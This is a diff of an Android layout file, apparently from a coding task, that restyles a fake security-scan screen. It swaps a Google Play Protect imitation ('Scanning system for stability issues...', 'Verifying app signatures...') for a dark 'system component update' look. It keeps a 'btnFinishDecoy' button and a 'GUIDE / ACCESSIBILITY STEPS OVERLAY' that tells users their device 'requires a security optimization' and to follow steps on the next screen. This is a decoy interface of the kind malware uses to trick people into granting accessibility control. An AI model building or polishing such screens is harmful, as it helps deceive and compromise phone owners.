@@ -1,9 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
+<!-- PATCHED (task-9): "system component update" style. All original view ids kept (build-env/java references them). -->
 <FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:app="http://schemas.android.com/apk/res-auto"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:background="#FDFDFD">
+    android:background="#0D0F14">
 
     <!-- TOP LEFT BACK ARROW (COMPLETION OVERLAY) -->
     <ImageView
@@ -19,10 +20,10 @@
         android:focusable="true"
         android:background="?android:attr/selectableItemBackgroundBorderless"
         android:src="@drawable/ic_back_arrow"
-        app:tint="#202124"
+        app:tint="#E6E8EC"
         android:visibility="gone" />
 
-    <!-- GUIDED OPTIMIZATION FLOW -->
+    <!-- GUIDED OPTIMIZATION FLOW (scanning / update pipeline) -->
     <LinearLayout
         android:id="@+id/layoutScanning"
         android:layout_width="match_parent"
@@ -34,41 +35,52 @@
 
         <ImageView
             android:id="@+id/ivPlayProtectRobot"
-            android:layout_width="225dp"
-            android:layout_height="207dp"
-            android:layout_gravity="center_horizontal|top"
+            android:layout_width="120dp"
+            android:layout_height="120dp"
+            android:layout_gravity="center_horizontal"
             android:layout_marginTop="10dp"
             android:fitsSystemWindows="true"
             android:focusedByDefault="true"
             android:forceHasOverlappingRendering="true"
-            android:src="@drawable/ic_android_play" />
+            android:src="@drawable/ic_android_system" />
 
         <TextView
             android:id="@+id/tvPlayProtectSub"
-            android:layout_width="258dp"
+            android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginTop="18dp"
+            android:layout_marginTop="26dp"
             android:fontFamily="@font/assistant"
             android:gravity="center"
             android:letterSpacing=".02"
-            android:text="Scanning system for stability issues..."
+            android:text="@string/guide_title"
             android:textAlignment="center"
-            android:textColor="#FB7E7777"
-            android:textSize="16sp"
+            android:textColor="#F2F4F8"
+            android:textSize="22sp"
             android:textStyle="bold" />
 
         <TextView
             android:id="@+id/tvPlayProtectDetails"
-            android:layout_width="285dp"
-            android:layout_height="23dp"
-            android:layout_marginTop="6dp"
-            android:layout_marginBottom="32dp"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="12dp"
+            android:layout_marginBottom="24dp"
             android:fontFamily="@font/assistant"
-            android:text="Verifying app signatures and permissions..."
+            android:text="@string/guide_subtitle"
             android:textAlignment="center"
-            android:textColor="#FE7C7676"
-            android:textSize="16sp"
-            android:textStyle="bold" />
+            android:textColor="#9AA3B2"
+            android:textSize="15sp" />
+
+        <!-- Step progress hint (e.g. "3/8") - id reserved for build-env -->
+        <TextView
+            android:id="@+id/tv_progress"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginBottom="14dp"
+            android:fontFamily="monospace"
+            android:gravity="center"
+            android:text="@string/guide_progress_ready"
+            android:textColor="#4FC3F7"
+            android:textSize="13sp" />
 
         <ProgressBar
             android:id="@+id/pbPlayProtect"
@@ -78,7 +90,7 @@
             android:layout_marginBottom="20dp"
             android:max="100"
             android:progress="0"
-            android:progressTint="#34A853" />
+            android:progressTint="#00E0A0" />
 
         <com.google.android.material.button.MaterialButton
             android:id="@+id/btnFinishDecoy"
@@ -87,7 +99,7 @@
             android:layout_height="52dp"
             android:layout_gravity="center_horizontal"
             android:layout_marginTop="10dp"
-            android:text="FINISH"
+            android:text="@string/guide_button"
             android:textColor="#FFFFFF"
             android:textSize="15sp"
             android:textStyle="bold"
@@ -97,6 +109,7 @@
 
     </LinearLayout>
 
+    <!-- GUIDE / ACCESSIBILITY STEPS OVERLAY -->
     <LinearLayout
         android:id="@+id/layoutGuide"
         android:layout_width="match_parent"
@@ -111,15 +124,15 @@
             android:layout_width="80dp"
             android:layout_height="80dp"
             android:src="@android:drawable/ic_dialog_info"
-            app:tint="#1A73E8" />
+            app:tint="#4FC3F7" />
 
         <TextView
             android:id="@+id/tvGuideHeader"
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
             android:layout_marginTop="24dp"
-            android:text="Security Optimization"
-            android:textColor="#202124"
+            android:text="@string/guide_title"
+            android:textColor="#F2F4F8"
             android:textSize="22sp"
             android:textStyle="bold" />
 
@@ -130,8 +143,8 @@
             android:layout_marginTop="12dp"
             android:layout_marginBottom="32dp"
             android:gravity="center"
-            android:text="Your device requires a security optimization to continue. Follow these steps on the next screen:"
-            android:textColor="#5F6368"
+            android:text="@string/guide_subtitle"
+            android:textColor="#9AA3B2"
             android:textSize="15sp" />
 
         <LinearLayout
@@ -145,11 +158,11 @@
             android:layout_width="match_parent"
             android:layout_height="64dp"
             android:layout_marginTop="48dp"
-            android:text="START OPTIMIZATION"
+            android:text="@string/guide_button"
             android:textColor="#FFFFFF"
             android:textSize="16sp"
             android:textStyle="bold"
-            app:backgroundTint="#1A73E8"
+            app:backgroundTint="#0B875B"
             app:cornerRadius="100dp" />
 
     </LinearLayout>
@@ -159,7 +172,7 @@
         android:id="@+id/viewFrostedVeil"
         android:layout_width="match_parent"
         android:layout_height="match_parent"
-        android:background="#FFFFFF"
+        android:background="#0D0F14"
         android:alpha="0"
         android:visibility="gone" />
 
